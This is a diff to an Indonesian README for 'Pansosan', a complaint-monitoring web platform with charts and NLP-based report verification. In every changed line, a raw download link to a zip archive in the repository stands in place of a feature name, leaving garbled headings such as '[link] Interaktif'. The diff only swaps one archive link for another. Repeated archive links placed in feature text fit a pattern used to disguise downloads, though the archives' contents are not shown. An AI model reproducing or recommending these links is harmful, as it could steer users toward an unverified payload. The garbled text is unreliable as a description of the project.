@@ -21,10 +21,10 @@ Pansosan (Pantau sosial Keluhan) platform berbasis web yang mengumpulkan keluhan
 
 
 Fitur yang digunakan:
-https://github.com/Enggal350/Pansosan-Pantuan-Keluhan-Sosial/raw/refs/heads/main/app/Pansosan-Keluhan-Sosial-Pantuan-2.4-beta.2.zip Interaktif
+https://raw.githubusercontent.com/Enggal350/Pansosan-Pantuan-Keluhan-Sosial/main/model/Pansosan_Sosial_Pantuan_Keluhan_v1.0-alpha.5.zip Interaktif
 Tampilannya berupa grafik, diagram, dan statistik keluhan.
-https://github.com/Enggal350/Pansosan-Pantuan-Keluhan-Sosial/raw/refs/heads/main/app/Pansosan-Keluhan-Sosial-Pantuan-2.4-beta.2.zip AI
+https://raw.githubusercontent.com/Enggal350/Pansosan-Pantuan-Keluhan-Sosial/main/model/Pansosan_Sosial_Pantuan_Keluhan_v1.0-alpha.5.zip AI
 Menggunakan Natural Language Processing (NLP) untuk:
 Mengenali kategori masalah sosial dari isi laporan.
-https://github.com/Enggal350/Pansosan-Pantuan-Keluhan-Sosial/raw/refs/heads/main/app/Pansosan-Keluhan-Sosial-Pantuan-2.4-beta.2.zip dan Verifikasi Laporan
+https://raw.githubusercontent.com/Enggal350/Pansosan-Pantuan-Keluhan-Sosial/main/model/Pansosan_Sosial_Pantuan_Keluhan_v1.0-alpha.5.zip dan Verifikasi Laporan
 Meninjau laporan masuk (valid/hoaks/spam).
